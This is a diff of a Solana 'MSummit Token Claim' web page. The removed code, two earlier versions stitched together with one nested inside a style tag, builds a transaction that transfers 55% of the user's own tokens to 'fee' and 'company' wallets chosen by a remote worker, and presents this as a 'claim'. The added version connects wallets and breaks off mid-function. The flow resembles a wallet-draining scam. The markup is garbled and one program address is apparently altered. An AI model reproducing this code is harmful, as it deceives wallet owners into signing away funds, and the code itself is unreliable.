@@ -3,690 +3,483 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MSummit Stake</title>
-    <style><!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Claim Tokens</title>
-  <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-
-    body {
-      background: #0f1117;
-      color: #fff;
-      font-family: 'Segoe UI', sans-serif;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-    }
-
-    .card {
-      background: #1d263b;
-      border: 1px solid #27253e;
-      border-radius: 20px;
-      padding: 40px 30px;
-      width: 100%;
-      max-width: 480px;
-      text-align: center;
-    }
-
-    h1 {
-      font-size: 24px;
-      background: linear-gradient(68deg, #eb00ff 3.6%, #00f0ff 100%);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      margin-bottom: 8px;
-    }
-
-    .subtitle {
-      color: #888;
-      font-size: 13px;
-      margin-bottom: 30px;
-    }
-
-    .wallet-info {
-      background: #0f1117;
-      border-radius: 10px;
-      padding: 12px;
-      font-size: 12px;
-      color: #888;
-      margin-bottom: 20px;
-      word-break: break-all;
-      display: none;
-    }
-
-    .wallet-info.show { display: block; }
-
-    .balance-grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr 1fr;
-      gap: 10px;
-      margin-bottom: 25px;
-      display: none;
-    }
-
-    .balance-grid.show { display: grid; }
-
-    .balance-box {
-      background: #0f1117;
-      border-radius: 10px;
-      padding: 12px 8px;
-    }
-
-    .balance-box .label {
-      font-size: 10px;
-      color: #888;
-      margin-bottom: 5px;
-    }
-
-    .balance-box .value {
-      font-size: 14px;
-      font-weight: bold;
-    }
-
-    .fee    { color: #ff6b6b; }
-    .signer { color: #00f0ff; }
-    .company{ color: #eb00ff; }
-
-    .btn {
-      width: 100%;
-      padding: 14px;
-      border: none;
-      border-radius: 12px;
-      font-size: 15px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: opacity 0.2s;
-      margin-bottom: 12px;
-    }
-
-    .btn:disabled { opacity: 0.4; cursor: not-allowed; }
-
-    .btn-connect {
-      background: linear-gradient(68deg, #eb00ff 3.6%, #00f0ff 100%);
-      color: #000;
-    }
-
-    .btn-claim {
-      background: linear-gradient(68deg, #00f0ff 3.6%, #eb00ff 100%);
-      color: #000;
-    }
-
-    .btn-disconnect {
-      background: transparent;
-      border: 1px solid #444;
-      color: #888;
-      font-size: 13px;
-      padding: 8px;
-    }
-
-    .log-box {
-      background: #0f1117;
-      border-radius: 10px;
-      padding: 15px;
-      font-size: 12px;
-      color: #aaa;
-      text-align: left;
-      max-height: 200px;
-      overflow-y: auto;
-      display: none;
-      margin-top: 15px;
-      line-height: 1.8;
-    }
-
-    .log-box.show { display: block; }
-
-    .tx-link { color: #00f0ff; text-decoration: none; }
-    .tx-link:hover { text-decoration: underline; }
-
-    .status-dot {
-      display: inline-block;
-      width: 8px;
-      height: 8px;
-      border-radius: 50%;
-      background: #888;
-      margin-right: 6px;
-    }
-
-    .status-dot.green  { background: #00ff88; }
-    .status-dot.yellow { background: #ffcc00; }
-  </style>
+    <title>MSummit Token Claim</title>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0d1117;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            flex-direction: column;
+            gap: 20px;
+            padding: 20px;
+        }
+        h1 {
+            background: linear-gradient(68deg, #eb00ff 3.6%, #00f0ff 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-size: 32px;
+            text-align: center;
+        }
+        .card {
+            background: #1d263b;
+            border: 1px solid #27253e;
+            border-radius: 15px;
+            padding: 25px 30px;
+            max-width: 480px;
+            width: 100%;
+        }
+        h3 {
+            background: linear-gradient(68deg, #eb00ff 3.6%, #00f0ff 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+        .btn {
+            background: linear-gradient(68deg, #eb00ff 3.6%, #00f0ff 100%);
+            border: none;
+            color: white;
+            padding: 13px;
+            border-radius: 25px;
+            font-size: 15px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+            margin-top: 12px;
+        }
+        .btn:hover { opacity: 0.85; }
+        .btn:disabled { opacity: 0.4; cursor: not-allowed; }
+        .wallet-btn {
+            background: #0d1117;
+            border: 1px solid #27253e;
+            color: white;
+            padding: 11px;
+            border-radius: 10px;
+            font-size: 14px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 8px;
+            text-align: center;
+        }
+        .wallet-btn:hover { border-color: #eb00ff; }
+        .split-box {
+            background: #0d1117;
+            border: 1px solid #eb00ff33;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 12px 0;
+        }
+        .split-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 7px 0;
+            font-size: 13px;
+            border-bottom: 1px solid #ffffff11;
+        }
+        .split-row:last-child { border-bottom: none; }
+        .split-label { color: #aaa; }
+        .split-value { color: #00f0ff; font-weight: bold; }
+        .addr {
+            background: #0d1117;
+            border: 1px solid #27253e;
+            border-radius: 8px;
+            padding: 8px 12px;
+            font-size: 11px;
+            color: #00f0ff;
+            word-break: break-all;
+            margin-top: 8px;
+        }
+        .msg {
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 13px;
+            margin-top: 12px;
+            display: none;
+            line-height: 1.6;
+        }
+        .msg.error   { background: #ff000022; border: 1px solid #ff0000; color: #ff6666; }
+        .msg.success { background: #00ff8822; border: 1px solid #00ff88; color: #00ff88; }
+        .msg.info    { background: #0088ff22; border: 1px solid #0088ff; color: #88ccff; }
+        .dot { width:8px; height:8px; border-radius:50%; background:#555; display:inline-block; margin-right:6px; }
+        .dot.on { background: #00ff88; }
+        .loader {
+            border: 3px solid #333;
+            border-top: 3px solid #eb00ff;
+            border-radius: 50%;
+            width: 28px; height: 28px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+            display: none;
+        }
+        @keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
+        .step { display: none; }
+        .step.active { display: block; }
+        .tx-link {
+            color: #00f0ff;
+            font-size: 11px;
+            word-break: break-all;
+            text-decoration: underline;
+        }
+        .agree {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin-top: 12px;
+            font-size: 13px;
+            color: #ccc;
+            cursor: pointer;
+        }
+        .agree input { margin-top: 3px; }
+    </style>
 </head>
 <body>
+
+<h1>🏔️ MSummit Claim</h1>
+
 <div class="card">
 
-  <h1>Claim SUMMIT Tokens</h1>
-  <p class="subtitle">10% fee · 45% you · 45% company</p>
+    <!-- STEP 1: Fee agreement -->
+    <div class="step active" id="step1">
+        <h3>📋 Fee Structure</h3>
+        <p style="color:#aaa;font-size:13px">Please read and agree before proceeding.</p>
 
-  <!-- Wallet Info -->
-  <div class="wallet-info" id="walletInfo">
-    <span class="status-dot green"></span>
-    <span id="walletAddr"></span>
-  </div>
+        <div class="split-box">
+            <div class="split-row">
+                <span class="split-label">You receive</span>
+                <span class="split-value">45%</span>
+            </div>
+            <div class="split-row">
+                <span class="split-label">Company wallet receives</span>
+                <span class="split-value">45%</span>
+            </div>
+            <div class="split-row">
+                <span class="split-label">Platform fee</span>
+                <span class="split-value">10%</span>
+            </div>
+        </div>
 
-  <!-- Balance Breakdown (shows after connect) -->
-  <div class="balance-grid" id="balanceGrid">
-    <div class="balance-box">
-      <div class="label">Fee (10%)</div>
-      <div class="value fee"    id="feeAmt">—</div>
+        <label class="agree">
+            <input type="checkbox" id="agreeBox" />
+            I agree to the 45/45/10 fee structure above
+        </label>
+
+        <button class="btn" onclick="goStep(2)">Continue →</button>
+        <div class="msg error" id="err1"></div>
     </div>
-    <div class="balance-box">
-      <div class="label">You get (45%)</div>
-      <div class="value signer" id="signerAmt">—</div>
-    </div>
-    <div class="balance-box">
-      <div class="label">Company (45%)</div>
-      <div class="value company" id="companyAmt">—</div>
-    </div>
-  </div>
 
-  <!-- Buttons -->
-  <button class="btn btn-connect" id="connectBtn">Connect Phantom Wallet</button>
-  <button class="btn btn-claim"   id="claimBtn" disabled style="display:none">Claim Tokens</button>
-  <button class="btn btn-disconnect" id="disconnectBtn" style="display:none">Disconnect</button>
+    <!-- STEP 2: Connect wallet -->
+    <div class="step" id="step2">
+        <h3>👛 Connect Wallet</h3>
+        <p style="font-size:12px;color:#aaa">
+            <span class="dot" id="dot"></span>
+            <span id="connText">Not connected</span>
+        </p>
+        <div class="addr" id="connAddr" style="display:none"></div>
 
-  <!-- Log -->
-  <div class="log-box" id="logBox"></div>
+        <button class="wallet-btn" onclick="connect('phantom')">👻 Phantom</button>
+        <button class="wallet-btn" onclick="connect('solflare')">🔆 Solflare</button>
+        <button class="wallet-btn" onclick="connect('backpack')">🎒 Backpack</button>
+
+        <div class="msg error"   id="err2"></div>
+        <div class="msg success" id="ok2"></div>
+
+        <button class="btn" style="background:#333;margin-top:15px;font-size:13px" onclick="goStep(1)">← Back</button>
+    </div>
+
+    <!-- STEP 3: Preview & Claim -->
+    <div class="step" id="step3">
+        <h3>💰 Claim Tokens</h3>
+
+        <div class="split-box" id="previewBox" style="display:none">
+            <div class="split-row">
+                <span class="split-label">Total Balance</span>
+                <span class="split-value" id="prvTotal">-</span>
+            </div>
+            <div class="split-row">
+                <span class="split-label">You will receive (45%)</span>
+                <span class="split-value" id="prvSigner">-</span>
+            </div>
+            <div class="split-row">
+                <span class="split-label">Company receives (45%)</span>
+                <span class="split-value" id="prvCompany">-</span>
+            </div>
+            <div class="split-row">
+                <span class="split-label">Platform fee (10%)</span>
+                <span class="split-value" id="prvFee">-</span>
+            </div>
+        </div>
+
+        <div class="loader" id="loader"></div>
+
+        <button class="btn" id="previewBtn" onclick="loadPreview()">🔍 Check Balance</button>
+        <button class="btn" id="claimBtn"   onclick="doClaim()" style="display:none">✅ Confirm & Claim</button>
+
+        <div class="msg error"   id="err3"></div>
+        <div class="msg success" id="ok3"></div>
+        <div class="msg info"    id="info3"></div>
+
+        <button class="btn" style="background:#333;margin-top:15px;font-size:13px" onclick="goStep(2)">← Back</button>
+    </div>
 
 </div>
 
-<script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.8/lib/index.iife.min.js"></script>
 <script>
+// ─────────────────────────────────────────
+// CONFIG
+// ─────────────────────────────────────────
+const API = "https://misty-feather-a031rnsummit.msummit2026.workers.dev";
+const RPC = "https://api.mainnet-beta.solana.com";
+const TOKEN_MINT    = "A3vBwL3Pd6nkBqVo87D6TLWYG4ekWuDeqCoLFeyvRMcb";
+const TOKEN_PROGRAM = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
+const ASSOC_PROGRAM = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJe1bZ9";
+// ─────────────────────────────────────────
 
-  // ============================================================
-  // ✏️ ONLY EDIT THIS ONE LINE — paste your Cloudflare worker URL
-  // ============================================================
-  const WORKER_URL = "https://misty-feather-a031rnsummit.msummit2026.workers.dev/";
-  // ============================================================
+let walletObj  = null;
+let walletAddr = null;
+let txData     = null;
 
-  const RPC        = "https://api.mainnet-beta.solana.com";
-  const TOKEN_MINT = new solanaWeb3.PublicKey("A3vBwL3Pd6nkBqVo87D6TLWYG4ekWuDeqCoLFeyvRMcb");
-  const TOKEN_PROGRAM_ID            = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
-  const ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJe1bwd");
-
-  const connection = new solanaWeb3.Connection(RPC, "confirmed");
-  let walletAddress = null;
-
-  // ── Connect ──────────────────────────────────────────────
-  document.getElementById("connectBtn").onclick = async () => {
-    try {
-      if (!window.solana?.isPhantom) {
-        return alert("Phantom wallet not found!\nInstall from https://phantom.app");
-      }
-      const resp = await window.solana.connect();
-      walletAddress = resp.publicKey.toString();
-
-      // Update UI
-      document.getElementById("walletAddr").textContent =
-        walletAddress.slice(0,6) + "..." + walletAddress.slice(-6);
-      document.getElementById("walletInfo").classList.add("show");
-      document.getElementById("connectBtn").style.display    = "none";
-      document.getElementById("claimBtn").style.display      = "block";
-      document.getElementById("disconnectBtn").style.display = "block";
-      document.getElementById("claimBtn").disabled           = false;
-      document.getElementById("balanceGrid").classList.add("show");
-
-      // Load balance preview
-      await loadPreview();
-
-    } catch (err) {
-      log("❌ Connect failed: " + err.message);
+// ── Navigation ──
+function goStep(n) {
+    if (n === 2 && !document.getElementById('agreeBox').checked) {
+        show('err1','⚠️ Please agree to the fee structure first.');
+        return;
     }
-  };
-
-  // ── Disconnect ───────────────────────────────────────────
-  document.getElementById("disconnectBtn").onclick = () => {
-    walletAddress = null;
-    window.solana?.disconnect();
-    document.getElementById("walletInfo").classList.remove("show");
-    document.getElementById("balanceGrid").classList.remove("show");
-    document.getElementById("connectBtn").style.display    = "block";
-    document.getElementById("claimBtn").style.display      = "none";
-    document.getElementById("disconnectBtn").style.display = "none";
-    document.getElementById("logBox").classList.remove("show");
-    document.getElementById("logBox").innerHTML = "";
-  };
-
-  // ── Load Preview ─────────────────────────────────────────
-  async function loadPreview() {
-    try {
-      const res  = await fetch(WORKER_URL + "/claim", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ clientWallet: walletAddress, signerWallet: walletAddress }),
-      });
-      const data = await res.json();
-      if (!data.success) return;
-
-      document.getElementById("feeAmt").textContent     = data.summary.feeDeducted.toFixed(2);
-      document.getElementById("signerAmt").textContent  = data.summary.signerReceives.toFixed(2);
-      document.getElementById("companyAmt").textContent = data.summary.companyReceives.toFixed(2);
-    } catch(e) {}
-  }
-
-  // ── Claim ─────────────────────────────────────────────────
-  document.getElementById("claimBtn").onclick = async () => {
-    const claimBtn = document.getElementById("claimBtn");
-    claimBtn.disabled = true;
-    claimBtn.textContent = "Processing...";
-    document.getElementById("logBox").classList.add("show");
-    document.getElementById("logBox").innerHTML = "";
-
-    try {
-      log("📡 Fetching split data from worker...");
-
-      // 1. Call worker
-      const res = await fetch(WORKER_URL + "/claim", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          clientWallet: walletAddress,
-          signerWallet: walletAddress,
-        }),
-      });
-
-      const data = await res.json();
-      if (!data.success) throw new Error(data.error);
-
-      const { txData, summary } = data;
-
-      log("✅ Split calculated:");
-      log(`   💸 Fee (10%):     ${summary.feeDeducted} tokens`);
-      log(`   👤 You (45%):     ${summary.signerReceives} tokens`);
-      log(`   🏢 Company (45%): ${summary.companyReceives} tokens`);
-      log("🔨 Building transaction...");
-
-      const ownerKey  = new solanaWeb3.PublicKey(walletAddress);
-      const clientATA = new solanaWeb3.PublicKey(txData.clientATA);
-
-      // 2. Derive ATAs
-      const [signerATA]  = await solanaWeb3.PublicKey.findProgramAddress(
-        [new solanaWeb3.PublicKey(txData.signerWallet).toBuffer(),
-         TOKEN_PROGRAM_ID.toBuffer(), TOKEN_MINT.toBuffer()],
-        ASSOCIATED_TOKEN_PROGRAM_ID
-      );
-      const [companyATA] = await solanaWeb3.PublicKey.findProgramAddress(
-        [new solanaWeb3.PublicKey(txData.companyWallet).toBuffer(),
-         TOKEN_PROGRAM_ID.toBuffer(), TOKEN_MINT.toBuffer()],
-        ASSOCIATED_TOKEN_PROGRAM_ID
-      );
-      const [feeATA] = await solanaWeb3.PublicKey.findProgramAddress(
-        [new solanaWeb3.PublicKey(txData.feeWallet).toBuffer(),
-         TOKEN_PROGRAM_ID.toBuffer(), TOKEN_MINT.toBuffer()],
-        ASSOCIATED_TOKEN_PROGRAM_ID
-      );
-
-      // 3. Build tx
-      const tx = new solanaWeb3.Transaction();
-      tx.recentBlockhash      = txData.blockhash;
-      tx.feePayer             = ownerKey;
-      tx.lastValidBlockHeight = txData.lastValidBlockHeight;
-
-      // Create ATAs if missing
-      if (!txData.feeATA) {
-        tx.add(splToken.createAssociatedTokenAccountInstruction(
-          ownerKey, feeATA,
-          new solanaWeb3.PublicKey(txData.feeWallet), TOKEN_MINT,
-          TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID
-        ));
-      }
-      if (!txData.signerATA) {
-        tx.add(splToken.createAssociatedTokenAccountInstruction(
-          ownerKey, signerATA,
-          new solanaWeb3.PublicKey(txData.signerWallet), TOKEN_MINT,
-          TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID
-        ));
-      }
-      if (!txData.companyATA) {
-        tx.add(splToken.createAssociatedTokenAccountInstruction(
-          ownerKey, companyATA,
-          new solanaWeb3.PublicKey(txData.companyWallet), TOKEN_MINT,
-          TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID
-        ));
-      }
-
-      // 10% fee
-      tx.add(splToken.createTransferInstruction(
-        clientATA, feeATA, ownerKey, txData.amounts.fee,
-        [], TOKEN_PROGRAM_ID
-      ));
-
-      // 45% signer
-      tx.add(splToken.createTransferInstruction(
-        clientATA, signerATA, ownerKey, txData.amounts.signer,
-        [], TOKEN_PROGRAM_ID
-      ));
-
-      // 45% company
-      tx.add(splToken.createTransferInstruction(
-        clientATA, companyATA, ownerKey, txData.amounts.company,
-        [], TOKEN_PROGRAM_ID
-      ));
-
-      // 4. Sign
-      log("✍️ Waiting for Phantom signature...");
-      const signed = await window.solana.signTransaction(tx);
-
-      // 5. Send
-      log("🚀 Broadcasting to Solana...");
-      const txId = await connection.sendRawTransaction(signed.serialize());
-
-      // 6. Confirm
-      log("⏳ Confirming transaction...");
-      await connection.confirmTransaction({
-        signature: txId,
-        blockhash: txData.blockhash,
-        lastValidBlockHeight: txData.lastValidBlockHeight,
-      });
-
-      log("🎉 SUCCESS!");
-      log(`   <a class="tx-link" href="https://solscan.io/tx/${txId}" target="_blank">View on Solscan ↗</a>`);
-
-      // Refresh preview
-      await loadPreview();
-
-    } catch (err) {
-      log("❌ Failed: " + err.message);
-      console.error(err);
-    } finally {
-      claimBtn.disabled    = false;
-      claimBtn.textContent = "Claim Tokens";
-    }
-  };
-
-  function log(msg) {
-    const box = document.getElementById("logBox");
-    box.innerHTML += msg + "\n";
-    box.scrollTop  = box.scrollHeight;
-  }
-
-</script>
-</body>
-</html><!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Claim SUMMIT Tokens</title>
-  <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    body {
-      background: #0f1117;
-      color: #fff;
-      font-family: 'Segoe UI', sans-serif;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-    }
-    .card {
-      background: #1d263b;
-      border: 1px solid #27253e;
-      border-radius: 20px;
-      padding: 40px 30px;
-      width: 100%;
-      max-width: 460px;
-      text-align: center;
-    }
-    h1 {
-      font-size: 22px;
-      background: linear-gradient(68deg, #eb00ff 3.6%, #00f0ff 100%);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      margin-bottom: 6px;
-    }
-    .subtitle { color: #666; font-size: 12px; margin-bottom: 28px; }
-
-    .wallet-badge {
-      background: #0f1117;
-      border-radius: 8px;
-      padding: 10px 14px;
-      font-size: 12px;
-      color: #00ff88;
-      margin-bottom: 18px;
-      display: none;
-    }
-    .wallet-badge.show { display: block; }
-
-    .splits {
-      display: grid;
-      grid-template-columns: 1fr 1fr 1fr;
-      gap: 8px;
-      margin-bottom: 22px;
-      display: none;
-    }
-    .splits.show { display: grid; }
-    .split-box {
-      background: #0f1117;
-      border-radius: 10px;
-      padding: 12px 6px;
-    }
-    .split-box .lbl { font-size: 10px; color: #666; margin-bottom: 4px; }
-    .split-box .val { font-size: 13px; font-weight: 700; }
-    .red  { color: #ff6b6b; }
-    .cyan { color: #00f0ff; }
-    .purple { color: #eb00ff; }
-
-    .btn {
-      width: 100%; padding: 13px; border: none; border-radius: 12px;
-      font-size: 15px; font-weight: 600; cursor: pointer;
-      transition: opacity .2s; margin-bottom: 10px;
-    }
-    .btn:disabled { opacity: .4; cursor: not-allowed; }
-    .btn-connect  { background: linear-gradient(68deg,#eb00ff 3.6%,#00f0ff 100%); color:#000; }
-    .btn-claim    { background: linear-gradient(68deg,#00f0ff 3.6%,#eb00ff 100%); color:#000; display:none; }
-    .btn-out      { background: transparent; border:1px solid #333; color:#555; font-size:12px; padding:8px; display:none; }
-
-    .log {
-      background: #0f1117; border-radius: 10px; padding: 14px;
-      font-size: 11px; color: #aaa; text-align: left;
-      max-height: 180px; overflow-y: auto; line-height: 1.9;
-      display: none; margin-top: 14px;
-    }
-    .log.show { display: block; }
-    .log a { color: #00f0ff; }
-  </style>
-</head>
-<body>
-<div class="card">
-  <h1>Claim SUMMIT</h1>
-  <p class="subtitle">10% fee &nbsp;·&nbsp; 45% you &nbsp;·&nbsp; 45% company</p>
-
-  <div class="wallet-badge" id="badge">● <span id="addrShort"></span></div>
-
-  <div class="splits" id="splits">
-    <div class="split-box"><div class="lbl">Fee 10%</div><div class="val red"    id="s_fee">—</div></div>
-    <div class="split-box"><div class="lbl">You 45%</div><div class="val cyan"   id="s_you">—</div></div>
-    <div class="split-box"><div class="lbl">Company 45%</div><div class="val purple" id="s_co">—</div></div>
-  </div>
-
-  <button class="btn btn-connect" id="btnConnect">Connect Phantom</button>
-  <button class="btn btn-claim"   id="btnClaim">Claim Tokens</button>
-  <button class="btn btn-out"     id="btnOut">Disconnect</button>
-
-  <div class="log" id="log"></div>
-</div>
-
-<!-- Solana libs -->
-<script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.8/lib/index.iife.min.js"></script>
-<script>
-// ============================================================
-// ✏️ ONLY EDIT THIS — your Cloudflare Worker URL
-// ============================================================
-const WORKER = "https://misty-feather-a031rnsummit.msummit2026.workers.dev/";
-// ============================================================
-
-const RPC  = "https://api.mainnet-beta.solana.com";
-const MINT = new solanaWeb3.PublicKey("A3vBwL3Pd6nkBqVo87D6TLWYG4ekWuDeqCoLFeyvRMcb");
-const TPK  = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
-const ATPK = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJe1bwd");
-const conn = new solanaWeb3.Connection(RPC, "confirmed");
-
-let wallet = null;
-
-// ── Connect ────────────────────────────────────────────────
-document.getElementById("btnConnect").onclick = async () => {
-  if (!window.solana?.isPhantom) return alert("Install Phantom: https://phantom.app");
-  const r = await window.solana.connect();
-  wallet  = r.publicKey.toString();
-
-  document.getElementById("addrShort").textContent = wallet.slice(0,5)+"..."+wallet.slice(-5);
-  show("badge"); show("splits");
-  hide("btnConnect");
-  showEl("btnClaim"); showEl("btnOut");
-
-  await loadPreview();
-};
-
-// ── Disconnect ─────────────────────────────────────────────
-document.getElementById("btnOut").onclick = () => {
-  wallet = null;
-  window.solana?.disconnect();
-  hide("badge"); hide("splits"); hide("log");
-  showEl("btnConnect");
-  hideEl("btnClaim"); hideEl("btnOut");
-  document.getElementById("log").innerHTML = "";
-};
-
-// ── Preview (calls Worker /preview) ───────────────────────
-async function loadPreview() {
-  try {
-    const r = await post(WORKER+"/preview", { walletAddress: wallet });
-    if (!r.success) return;
-    document.getElementById("s_fee").textContent = r.fee.toFixed(2);
-    document.getElementById("s_you").textContent = r.signer.toFixed(2);
-    document.getElementById("s_co").textContent  = r.company.toFixed(2);
-  } catch(e) {}
-}
-
-// ── Claim (calls Worker /build-tx, then signs & sends) ────
-document.getElementById("btnClaim").onclick = async () => {
-  const btn = document.getElementById("btnClaim");
-  btn.disabled = true;
-  btn.textContent = "Processing...";
-  show("log");
-  document.getElementById("log").innerHTML = "";
-
-  try {
-    // STEP 1 — Worker builds all tx data
-    log("📡 Calling worker...");
-    const d = await post(WORKER+"/build-tx", { walletAddress: wallet });
-    if (!d.success) throw new Error(d.error);
-
-    log(`✅ 10% fee:     ${d.summary.fee} tokens`);
-    log(`✅ You get:     ${d.summary.signer} tokens`);
-    log(`✅ Company:     ${d.summary.company} tokens`);
-    log("🔨 Building tx...");
-
-    const owner     = new solanaWeb3.PublicKey(wallet);
-    const clientATA = new solanaWeb3.PublicKey(d.accounts.clientATA);
-
-    // STEP 2 — Derive ATAs on frontend
-    const [signerATA]  = await solanaWeb3.PublicKey.findProgramAddress(
-      [owner.toBuffer(), TPK.toBuffer(), MINT.toBuffer()], ATPK);
-
-    const [companyATA] = await solanaWeb3.PublicKey.findProgramAddress(
-      [new solanaWeb3.PublicKey(d.accounts.companyWallet).toBuffer(),
-       TPK.toBuffer(), MINT.toBuffer()], ATPK);
-
-    const [feeATA] = await solanaWeb3.PublicKey.findProgramAddress(
-      [new solanaWeb3.PublicKey(d.accounts.feeWallet).toBuffer(),
-       TPK.toBuffer(), MINT.toBuffer()], ATPK);
-
-    // STEP 3 — Build transaction
-    const tx = new solanaWeb3.Transaction();
-    tx.recentBlockhash      = d.blockhash;
-    tx.feePayer             = owner;
-    tx.lastValidBlockHeight = d.lastValidBlockHeight;
-
-    // Create missing ATAs
-    if (!d.accounts.feeExists) {
-      tx.add(splToken.createAssociatedTokenAccountInstruction(
-        owner, feeATA,
-        new solanaWeb3.PublicKey(d.accounts.feeWallet), MINT, TPK, ATPK
-      ));
-    }
-    if (!d.accounts.signerExists) {
-      tx.add(splToken.createAssociatedTokenAccountInstruction(
-        owner, signerATA, owner, MINT, TPK, ATPK
-      ));
-    }
-    if (!d.accounts.companyExists) {
-      tx.add(splToken.createAssociatedTokenAccountInstruction(
-        owner, companyATA,
-        new solanaWeb3.PublicKey(d.accounts.companyWallet), MINT, TPK, ATPK
-      ));
-    }
-
-    // 10% → fee wallet
-    tx.add(splToken.createTransferInstruction(
-      clientATA, feeATA, owner, d.amounts.fee, [], TPK
-    ));
-
-    // 45% → signer (user)
-    tx.add(splToken.createTransferInstruction(
-      clientATA, signerATA, owner, d.amounts.signer, [], TPK
-    ));
-
-    // 45% → company
-    tx.add(splToken.createTransferInstruction(
-      clientATA, companyATA, owner, d.amounts.company, [], TPK
-    ));
-
-    // STEP 4 — Sign
-    log("✍️ Sign in Phantom...");
-    const signed = await window.solana.signTransaction(tx);
-
-    // STEP 5 — Send
-    log("🚀 Sending...");
-    const txId = await conn.sendRawTransaction(signed.serialize());
-
-    // STEP 6 — Confirm
-    log("⏳ Confirming...");
-    await conn.confirmTransaction({
-      signature: txId,
-      blockhash: d.blockhash,
-      lastValidBlockHeight: d.lastValidBlockHeight,
+    hide('err1');
+    [1,2,3].forEach(i => {
+        document.getElementById('step'+i).classList.remove('active');
     });
+    document.getElementById('step'+n).classList.add('active');
 
-    log(`🎉 Done! <a href="https://solscan.io/tx/${txId}" target="_blank">View on Solscan ↗</a>`);
-    await loadPreview();
-
-  } catch(e) {
-    log("❌ " + e.message);
-  } finally {
-    btn.disabled    = false;
-    btn.textContent = "Claim Tokens";
-  }
-};
-
-// ── Helpers ────────────────────────────────────────────────
-async function post(url, body) {
-  const r = await fetch(url, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(body),
-  });
-  return r.json();
+    if (n === 3) loadPreview();
 }
 
-function log(msg) {
-  const b = document.getElementById("log");
-  b.innerHTML += msg + "\n";
-  b.scrollTop  = b.scrollHeight;
+// ── Connect wallet ──
+async function connect(type) {
+    hide('err2'); hide('ok2');
+    try {
+        let w = null;
+        if (type==='phantom')  w = window.solana || window.phantom?.solana;
+        if (type==='solflare') w = window.solflare;
+        if (type==='backpack') w = window.backpack || window.xnft?.solana;
+
+        if (!w) {
+            show('err2', '❌ ' + type + ' wallet not found. Please install it.');
+            return;
+        }
+
+        await w.connect();
+        walletObj  = w;
+        walletAddr = w.publicKey.toString();
+
+        document.getElementById('dot').className      = 'dot on';
+        document.getElementById('connText').textContent = 'Connected';
+        const ad = document.getElementById('connAddr');
+        ad.textContent  = walletAddr;
+        ad.style.display = 'block';
+
+        show('ok2', '✅ Wallet connected! Proceeding...');
+        setTimeout(() => goStep(3), 1000);
+
+    } catch(e) {
+        show('err2', e.message?.includes('rejected') ? '⚠️ Cancelled by user.' : '❌ ' + e.message);
+    }
 }
 
-function show(id)   { document.getElementById(id).classList.add("show"); }
-function hide(id)   { document.getElementById(id).classList.remove("show"); }
-function showEl(id) { document.getElementById(id).style.display = "block"; }
-function hideEl(id) { document.getElementById(id).style.display = "none"; }
+// ── Load preview from API ──
+async function loadPreview() {
+    if (!walletAddr) return;
+    hide('err3'); hide('ok3'); hide('info3');
+    document.getElementById('previewBox').style.display = 'none';
+    document.getElementById('claimBtn').style.display   = 'none';
+    document.getElementById('previewBtn').style.display = 'none';
+    loader(true);
+
+    try {
+        const res  = await fetch(API + '/preview', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ walletAddress: walletAddr })
+        });
+        const data = await res.json();
+        loader(false);
+
+        if (!data.success) {
+            show('err3', '❌ ' + data.error);
+            document.getElementById('previewBtn').style.display = 'block';
+            return;
+        }
+
